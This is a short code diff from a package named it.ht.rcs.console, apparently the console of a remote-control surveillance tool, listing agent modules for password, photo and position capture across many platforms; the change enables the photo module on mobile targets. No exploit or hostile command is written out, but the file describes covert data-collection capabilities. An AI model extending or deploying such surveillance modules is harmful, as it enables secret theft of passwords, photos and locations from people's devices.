@@ -82,7 +82,7 @@ package it.ht.rcs.console
 
 				{module: "password", _type: "desktop,mobile", _platform: "windows,symbian,linux,android,osx"},
         
-        {module: "photo", _type: "desktop", _platform: "windows,android"},
+        {module: "photo", _type: "desktop,mobile", _platform: "windows,android"},
 
 				{module: "position", gps: false, cell: true, wifi: true, _type: "desktop,mobile", _platform: "windows,osx,blackberry,winmo,symbian,android,ios,linux,winphone"},
 
